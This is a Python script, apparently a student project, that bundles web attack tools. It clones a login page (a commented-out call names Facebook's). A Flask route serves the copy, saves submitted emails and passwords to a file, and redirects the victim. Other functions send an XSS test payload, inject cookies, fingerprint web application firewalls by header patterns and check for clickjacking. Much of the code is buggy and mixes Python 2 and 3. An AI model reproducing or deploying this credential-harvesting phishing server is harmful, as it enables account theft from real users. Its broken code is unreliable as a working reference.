#! /usr/bin/env python
import urllib
import re
from urllib import *
import requests
from flask import *
from bs4 import *
from scapy.all import *
app = Flask(__name__,template_folder="/home/vlad/Desktop/Sch00L_Pr0ject")

def copy_content(website):

	url = website	
	response = urllib.urlopen(url)
	page_content = response.read()
	soup = BeautifulSoup(page_content,'html.parser')
	f = open('phing.html','w')
	f.write(soup.prettify().encode('utf8'))
	f.close()

def inject_custom_packets():
    
    #print("cant connect,maybe you are missing a packet.Check your dependencies")        
    #test if packet can be send
    p = srloop(IP(dst="127.0.0.1")/"HELLO",count=10)
    
    
def get_current_version():
    current_version = platform.python_version()
    if '2.7' in current_version:
        print("sorry buddy you'll need to get python 3.6 to be able to run it")

def check_if_clickhijacking():
    result = urlopen("https://www.lookout.net/test/clickjack.html")
    if 'X-Frame-Options' not in result.info():
        print "Possible clickjacking website found.Trying another test just to be shure!"
    soup = BeautifulSoup(result.read(),'html.parser')
    if re.finditer('iframe src=',soup.prettify()):
        print "Oh bud you have some issues!"

def inject_custom_cookie():
    try:
        url = urllib.request(raw_input())
        url.add_header('Cookie',raw_input())
        info = urllib.urlopen(url)
    except urllib.error.URLError:
        print("cant connect to the wesite")

def check_if_no_wap_http_method(url,url2):
    target = url
    result = urlopen(target)
    if result.getcode() == 200:
        payload = {"query":"<script>alert()</script>"}
        new_result = requests.get(target,payload)
        if new_result.status_code == 200:
            if "<script>alert()</script>" in new_result.text:
                print("u are vulnerable")
            else:
                print("Exploit doesnt exists")
    target2 = url2
    result2 = urlopen(target2)
    if result2.getcode() == 200:
        new_payload = {"PageID=99>\"": "<script>alert();</script>"}
        new2_result = requests.get(target, new_payload)
        if new2_result.status_code == 404:
            print("found wap ")


    else:
        print("ERRor while connecting to the website")

def check_cookie(url):
    import os
    target = url
    result = urlopen(target)
    if result.getcode() == 200:
        if re.findall("(.ns_)+",str(result.info())):
            print("found firewall 1")
            os.system(exit(0))
        elif re.findall("^(Cneonction: close)+",str(result.info())):
            print("found firewall 2")
            os.system(exit(0))
        elif re.findall("^(Cneonction: close)+",str(result.info())):
            print("found firewall 3")
            os.system(exit(0))
        else:
            print("no firewall detected Citrix Netscaler")
            os.system(exit(0))

        if re.findall("^TS[a-zA-Z0-9]{3,6}",str(result.info())):
            print("found F5 Big IP ASM")
        else:
            print("no firewall detected F5 Big IP ASM")
        if re.compile(("^ASISINFO=|cookie|server|F5-TrafficShield"),str(result.info)):
            print("found F5 Big IP traffic shield")
        else:
            print("no traffic shield detected")


@app.route('/',methods=['GET','POST'])
def start_phising():
    if request.method == 'POST':
        username = request.form['email']
        password = request.form['password']
        f = open('credentials.text','w')
        f.write(username+":")
        f.write(password)
        f.close()
        return redirect("https://www.examample.com",306)
    elif request.method == "GET":
        return render_template('phing.html')
    else:
        pass


def main():
	#interact(inject_custom_packets())
	#copy_content("https://www.facebook.com/login.php")
    pass

if __name__ == "__main__":
    #main()
    #check_if_waf()
    check_if_clickhijacking()
	#app.run(debug=True,host="0.0.0.0")

